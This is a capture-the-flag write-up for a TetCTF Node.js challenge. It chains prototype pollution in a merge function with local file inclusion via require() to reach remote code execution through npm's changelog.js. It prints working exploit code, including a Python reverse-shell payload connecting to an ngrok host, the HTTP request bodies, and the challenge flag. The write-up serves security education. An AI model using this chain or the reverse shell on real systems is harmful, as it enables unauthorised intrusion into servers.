<h1>Animals</h1>

<p>{% file src="../../.gitbook/assets/animals-countdown.zip" %}</p>

<p>There is a prototype pollution vulnerability in <code>/api/tet/list</code> when merging the request data:</p>

<p><code>javascript
app.post('/api/tet/list', function (req, res, next) {
    try {
        const getList1 = require("./static/list-2010-2016.js")
        const getList2 = require("./static/list-2017-2022.js")
        let newList = merge(getList1.all(), getList2.all())
        let data = req.body.data || "";
        newList = merge(newList, data);
        res.json(newList)
    } catch (error) {
        res.send(error)
    }
})
</code></p>

<p>Furthermore, user input being passed to <code>require()</code> leads to a LFI vulnerability.</p>

<p><code>javascript
app.post('/api/tet/years', function (req, res, next) {
    try {
        const list = req.body.list.toString();
        const getList = require("./static/" + list)
        res.json(getList.all())
    } catch (error) {
        console.log(error);
        res.send(error)
    }
})
</code></p>

<p>If we could find a <em>valid <code>.js</code> file</em> that <em>uses an attribute that we are able to pollute</em> to spawn a new process or execute a command, then we could escalate this to an RCE.</p>

<p>In the Docker container, the most likely place where we could find a suitable candidate would be in the <code>node_modules</code> folder, containing the source code of the installed modules.</p>

<p>Doing a simple search for the <code>child_process</code> string, we could find some interesting scripts:</p>

<p>```
$ cd /usr/local/lib/node<em>modules
$ grep -r "child</em>process" .</p>

<p>...</p>

<p>./npm/scripts/changelog.js:const execSync = require('child<em>process').execSync
./npm/scripts/update-dist-tags.js:const { execSync } = require('child</em>process')
```</p>

<p>The <code>changelog.js</code> script indeed has an <code>execSync</code> call with a possible command injection.</p>

<p>```javascript
'use strict'
/*
Usage:</p>

<p>node scripts/changelog.js [comittish]</p>

<p>Generates changelog entries in our format as best as its able based on
commits starting at comittish, or if that's not passed, latest.</p>

<p>Ordinarily this is run via the gen-changelog shell script, which appends
the result to the changelog.</p>

<p>*/
const execSync = require('child_process').execSync
const branch = process.argv[2] || 'origin/latest'
const log = execSync(<code>git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...</code>).toString().split(/\n/)
```</p>

<p>Since the <code>require()</code> call would not pass in any arguments, <code>process.argv[2]</code> is undefined. Therefore, we can pollute <code>process.argv[2]</code> with a command injection payload before importing the <code>changelog.js</code> file.</p>

<p>Testing this locally:</p>

<p>```javascript
let a = {}</p>

<p>const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;
const merge = (dest, src) =&gt; {
    for (var attr in src) {
        console.log(attr);
        if (isObject(dest[attr]) &amp;&amp; isObject(src[attr])) {
            merge(dest[attr], src[attr]);
        } else {
            dest[attr] = src[attr];
        }
    }
    return dest
};</p>

<p>b = { 
    ['<strong>proto</strong>']: { 
        '2': "; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF<em>INET,socket.SOCK</em>STREAM);s.connect((\"6.tcp.ngrok.io\",13984));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")';"
    } 
}</p>

<p>merge(a, b);
require('./changelog.js');
```</p>

<p>To perform this exploit chain on web server, we first perform the prototype pollution:</p>

<p>```http
POST /api/tet/list HTTP/1.1</p>

<p>...</p>

<p>Content-Type: application/json</p>

<p>{
    "data": {
        "<strong>proto</strong>": {
            "2":"; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF<em>INET,socket.SOCK</em>STREAM);s.connect((\"6.tcp.ngrok.io\",13984));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")';"
        }
    }
}
```</p>

<p>Then, we exploit the LFI vulnerability to execute the <code>changelog.js</code> script.</p>

<p>```http
POST /api/tet/years HTTP/1.1</p>

<p>...</p>

<p>Content-Type: application/json
Content-Length: 81</p>

<p>{"list":"../../../../../usr/local/lib/node_modules/npm/scripts/changelog.js"}
```</p>

<p>This should grant us our reverse shell.</p>

<p><code>
$ cd /
$ ./readflag
TetCTF{c0mbine_p0lLut3_lFiii_withN0d3&lt;3}
</code></p>
